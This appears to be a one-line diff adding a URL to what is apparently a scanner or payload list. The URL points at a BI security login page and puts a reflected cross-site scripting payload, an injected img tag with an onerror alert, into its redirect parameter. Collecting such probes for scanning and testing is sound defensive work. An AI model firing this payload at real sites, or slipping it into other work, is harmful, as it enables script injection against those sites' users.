@@ -1,0 +1,1 @@
+/bi-security-login/login.jsp?msi=false&redirect="><img/src/onerror%3dalert('xss')>
